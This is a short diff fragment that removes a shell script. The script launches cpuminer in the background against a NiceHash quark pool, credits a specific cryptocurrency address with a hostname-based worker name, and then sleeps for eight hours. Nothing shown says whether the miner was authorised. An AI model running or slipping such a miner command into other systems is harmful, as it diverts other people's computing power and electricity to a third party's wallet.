@@ -1,3 +1,0 @@
-cpuminer -a quark -o stratum+tcp://quark.hk.nicehash.com:3345 -u 1GYFNyra9yTcX74ibEx2Vwjio81yBKBT5m.`hostname` -p x &
-sleep $[60 * 60 * 8] # 8 hrs
-
